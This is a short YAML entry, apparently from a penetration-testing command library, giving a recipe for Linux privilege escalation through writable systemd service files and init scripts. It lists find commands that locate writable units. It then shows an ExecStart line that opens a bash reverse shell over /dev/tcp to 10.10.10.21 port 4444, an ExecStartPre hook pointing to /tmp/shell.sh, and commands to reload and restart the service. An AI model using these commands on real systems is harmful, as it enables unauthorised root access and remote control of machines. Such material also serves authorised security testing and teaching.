---
description: |
  Escalate privileges on Linux by exploiting writable systemd service files or init scripts. Modify ExecStart to execute a reverse shell or add a malicious ExecStartPre directive.
command: |
  # Find writable systemd service files
  find /etc/systemd/system/ -writable 2>/dev/null
  find /lib/systemd/system/ -writable 2>/dev/null
  find /run/systemd/system/ -writable 2>/dev/null

  # Find writable init scripts
  find /etc/init.d/ -writable 2>/dev/null

  # Check service file permissions
  ls -la /etc/systemd/system/
  ls -la /lib/systemd/system/

  # Modify writable service to execute reverse shell
  # Edit the ExecStart line:
  # ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1'

  # Or add to existing service
  # ExecStartPre=/tmp/shell.sh

  # Reload and restart
  systemctl daemon-reload
  systemctl restart vulnerable-service

  # If can't restart, wait for reboot or check if timer triggers it
  systemctl list-timers
items:
  - Shell
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - Writable_Service
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-service-binaries
  - https://gtfobins.github.io/
---
